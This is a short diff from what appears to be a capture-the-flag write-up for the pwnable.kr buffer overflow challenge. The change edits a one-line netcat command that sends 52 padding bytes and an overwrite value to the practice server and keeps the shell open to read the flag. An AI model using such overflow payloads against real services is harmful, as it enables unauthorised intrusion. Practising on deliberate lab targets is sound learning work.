@@ -23,7 +23,7 @@ you can see 5 word after `A`s there is `deadbeaf`; so we must enter 13 word `A` 
 so use this command to make if condition be `TRUE` and after than write `cat flag` to see the flag.
 </br>
 ```
-$ (python -c "print 'A'*52+'\xbe\xba\xfe\xca'") | nc pwnable.kr 9000
+$ (python -c "print 'A'*52+'\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
 ```
 ---
 **TWO**</br>
